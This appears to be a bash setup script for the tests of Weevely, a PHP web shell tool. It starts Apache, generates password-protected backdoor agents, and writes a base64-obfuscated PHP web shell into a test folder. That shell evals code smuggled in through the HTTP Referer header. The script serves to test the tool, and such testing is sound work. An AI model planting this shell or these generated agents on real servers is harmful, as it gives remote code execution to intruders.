#!/bin/bash
set -e -x

BASE_FOLDER="`python -c 'from tests import config;print(config.base_folder)'`"
AGENT="`python -c 'from tests import config;print(config.agent)'`"
URL="`python -c 'from tests import config;print(config.url)'`"
PWD="`python -c 'from tests import config;print(config.password)'`"

service apache2 start

# Generic environment setting install
mkdir -p "$BASE_FOLDER"
python ./weevely.py generate "$PWD" "$AGENT"

# Test_channels env setup
FOLDER_TEST_CHANNELS="$BASE_FOLDER/test_channels/"
mkdir -p "$FOLDER_TEST_CHANNELS"
echo "<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWy\
dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
b3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWN\
vZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGE\
sY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>" > "$FOLDER_TEST_CHANNELS/legacyreferrer.php"
python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$FOLDER_TEST_CHANNELS/stegaref_php_debug.php"
python ./weevely.py generate -agent legacycookie_php "$PWD" "$FOLDER_TEST_CHANNELS/legacycookie_php.php"


python -m unittest discover -s ./tests/